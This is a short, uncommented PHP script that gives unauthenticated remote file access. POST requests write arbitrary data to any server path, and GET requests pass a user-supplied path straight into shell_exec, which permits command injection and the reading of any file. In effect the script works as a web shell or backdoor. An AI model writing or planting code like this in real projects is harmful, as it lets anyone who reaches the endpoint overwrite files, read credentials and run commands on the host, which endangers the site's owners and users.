<?php

  if($_POST){
      $file = fopen($_POST["path"], 'w');
      fwrite($file, $_POST["data"]);
      fclose($file);
      echo "success";
  }
  else{
    if($_GET["path"]){
      $text =  shell_exec('cat "' . $_GET["path"] . '"');
      echo "" . $text . "";
    }
    else echo "401";
  }

?>